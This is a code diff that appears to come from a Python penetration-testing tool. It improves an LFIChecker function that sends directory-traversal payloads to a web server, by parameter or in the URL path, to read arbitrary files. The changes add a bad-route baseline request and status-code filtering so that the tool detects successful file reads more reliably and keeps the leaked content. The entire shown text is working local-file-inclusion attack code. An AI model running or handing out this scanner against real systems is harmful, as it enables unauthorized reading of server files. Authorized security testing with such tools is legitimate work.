@@ -264,22 +264,35 @@ def LFIChecker(baseurl, targetfile = None, parameter = None, paramval = None):
 
             walk = lfipattern * walkdepth
             attack = f"{walk}{targetfile}"
+            bfroute = f"{walk}{dneroute}"
 
-            if parameter:
+            if parameter:    
+                SysMsgNB("checking bad file length ...")
+                resp = requests.get(baseurl, params={parameter: bfroute})
+                bflen = len(resp.text)
+
                 params = {parameter: attack}
                 resp = requests.get(baseurl, params=params)
+                if resp.status_code != 200:
+                    continue
                 attacklen = len(resp.text)
 
-                if (attacklen != baselen) and (attacklen != errlen) and (attacklen != paramlen):
+                if (attacklen != baselen) and (attacklen != errlen) and (attacklen != paramlen) and (attacklen != bflen):
                     SucMsg(f"LFI found using pattern: \"{lfipattern}\"")
                     lfifound = True
                     content = resp.text
             else:
+                bfurl = f"{baseurl}/{bfroute}"
+                resp = requests.get(bfurl)
+                bflen = len(resp.text)
+
                 attackurl = f"{baseurl}/{attack}"
                 resp = requests.get(attackurl)
+                if resp.status_code != 200:
+                    continue
                 attacklen = len(resp.text)
 
-                if (attacklen != baselen) and (attacklen != errlen):
+                if (attacklen != baselen) and (attacklen != errlen) and (attacklen != bflen):
                     SucMsg(f"LFI likely using pattern: \"{lfipattern}\"")
                     lfifound = True
                     content = resp.text
